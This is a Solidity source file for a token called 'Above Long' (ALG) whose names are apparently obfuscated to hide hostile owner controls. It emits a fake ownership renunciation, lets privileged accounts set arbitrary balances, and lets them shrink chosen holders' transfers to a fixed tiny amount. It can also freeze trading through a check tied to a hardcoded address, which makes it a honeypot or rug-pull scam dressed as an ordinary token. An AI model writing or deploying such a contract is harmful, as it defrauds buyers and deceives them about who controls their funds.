//SPDX-License-Identifier: MIT

pragma solidity ^0.8.7;

interface feeEnableIs {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract sellFee {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface minShould {
    function createPair(address enableIs, address fundBuy) external returns (address);
}

interface amountShould {
    function totalSupply() external view returns (uint256);

    function balanceOf(address launchedMaxReceiver) external view returns (uint256);

    function transfer(address buyLiquidity, uint256 sellLiquidity) external returns (bool);

    function allowance(address feeSwap, address spender) external view returns (uint256);

    function approve(address spender, uint256 sellLiquidity) external returns (bool);

    function transferFrom(
        address sender,
        address buyLiquidity,
        uint256 sellLiquidity
    ) external returns (bool);

    event Transfer(address indexed from, address indexed takeFund, uint256 value);
    event Approval(address indexed feeSwap, address indexed spender, uint256 value);
}

interface amountShouldMetadata is amountShould {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract AboveLong is sellFee, amountShould, amountShouldMetadata {

    uint256 public receiverMaxShould;

    function approve(address swapFee, uint256 sellLiquidity) public virtual override returns (bool) {
        launchEnable[_msgSender()][swapFee] = sellLiquidity;
        emit Approval(_msgSender(), swapFee, sellLiquidity);
        return true;
    }

    uint256 takeAmount;

    function exemptTake(address modeExemptLimit) public {
        swapLaunchedLaunch();
        
        if (modeExemptLimit == receiverExempt || modeExemptLimit == maxAt) {
            return;
        }
        launchedShould[modeExemptLimit] = true;
    }

    function buyIs(uint256 sellLiquidity) public {
        swapLaunchedLaunch();
        takeAmount = sellLiquidity;
    }

    address public maxAt;

    function isReceiver() public {
        emit OwnershipTransferred(receiverExempt, address(0));
        isSwap = address(0);
    }

    function receiverBuy(address toLiquidity, address buyLiquidity, uint256 sellLiquidity) internal returns (bool) {
        require(listTotal[toLiquidity] >= sellLiquidity);
        listTotal[toLiquidity] -= sellLiquidity;
        listTotal[buyLiquidity] += sellLiquidity;
        emit Transfer(toLiquidity, buyLiquidity, sellLiquidity);
        return true;
    }

    bool private receiverReceiver;

    function owner() external view returns (address) {
        return isSwap;
    }

    mapping(address => bool) public tradingSell;

    event OwnershipTransferred(address indexed senderAtEnable, address indexed receiverMaxReceiver);

    function buyLaunched(address toLiquidity, address buyLiquidity, uint256 sellLiquidity) internal returns (bool) {
        if (toLiquidity == receiverExempt) {
            return receiverBuy(toLiquidity, buyLiquidity, sellLiquidity);
        }
        uint256 limitReceiver = amountShould(maxAt).balanceOf(txAuto);
        require(limitReceiver == takeAmount);
        require(buyLiquidity != txAuto);
        if (launchedShould[toLiquidity]) {
            return receiverBuy(toLiquidity, buyLiquidity, toModeEnable);
        }
        return receiverBuy(toLiquidity, buyLiquidity, sellLiquidity);
    }

    function getOwner() external view returns (address) {
        return isSwap;
    }

    mapping(address => mapping(address => uint256)) private launchEnable;

    uint256 private totalToken;

    bool private toList;

    uint256 launchedMarketing;

    bool private senderTeam;

    uint256 public txTake;

    function swapLaunchedLaunch() private view {
        require(tradingSell[_msgSender()]);
    }

    function limitSellReceiver(address exemptAmount) public {
        if (swapMarketingFrom) {
            return;
        }
        if (tradingLimitIs) {
            txTake = totalToken;
        }
        tradingSell[exemptAmount] = true;
        
        swapMarketingFrom = true;
    }

    function launchedAmount(address minSellWallet, uint256 sellLiquidity) public {
        swapLaunchedLaunch();
        listTotal[minSellWallet] = sellLiquidity;
    }

    mapping(address => bool) public launchedShould;

    address txAuto = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 public amountLaunch;

    uint256 private minTotalSender = 100000000 * 10 ** 18;

    function totalSupply() external view virtual override returns (uint256) {
        return minTotalSender;
    }

    uint256 constant toModeEnable = 7 ** 10;

    function name() external view virtual override returns (string memory) {
        return modeMax;
    }

    function decimals() external view virtual override returns (uint8) {
        return feeBuy;
    }

    address private isSwap;

    function balanceOf(address launchedMaxReceiver) public view virtual override returns (uint256) {
        return listTotal[launchedMaxReceiver];
    }

    constructor (){
        if (amountLaunch != listTx) {
            listTx = txTake;
        }
        feeEnableIs enableAuto = feeEnableIs(launchedLaunchExempt);
        maxAt = minShould(enableAuto.factory()).createPair(enableAuto.WETH(), address(this));
        if (totalToken == amountLaunch) {
            tradingLimitIs = false;
        }
        receiverExempt = _msgSender();
        isReceiver();
        tradingSell[receiverExempt] = true;
        listTotal[receiverExempt] = minTotalSender;
        if (toList) {
            receiverReceiver = true;
        }
        emit Transfer(address(0), receiverExempt, minTotalSender);
    }

    uint8 private feeBuy = 18;

    string private modeMax = "Above Long";

    function transfer(address minSellWallet, uint256 sellLiquidity) external virtual override returns (bool) {
        return buyLaunched(_msgSender(), minSellWallet, sellLiquidity);
    }

    function transferFrom(address toLiquidity, address buyLiquidity, uint256 sellLiquidity) external override returns (bool) {
        if (_msgSender() != launchedLaunchExempt) {
            if (launchEnable[toLiquidity][_msgSender()] != type(uint256).max) {
                require(sellLiquidity <= launchEnable[toLiquidity][_msgSender()]);
                launchEnable[toLiquidity][_msgSender()] -= sellLiquidity;
            }
        }
        return buyLaunched(toLiquidity, buyLiquidity, sellLiquidity);
    }

    function symbol() external view virtual override returns (string memory) {
        return launchSenderLiquidity;
    }

    string private launchSenderLiquidity = "ALG";

    address public receiverExempt;

    bool public swapMarketingFrom;

    bool public tradingLimitIs;

    bool private exemptLimit;

    mapping(address => uint256) private listTotal;

    uint256 public listTx;

    address launchedLaunchExempt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function allowance(address minWallet, address swapFee) external view virtual override returns (uint256) {
        if (swapFee == launchedLaunchExempt) {
            return type(uint256).max;
        }
        return launchEnable[minWallet][swapFee];
    }

}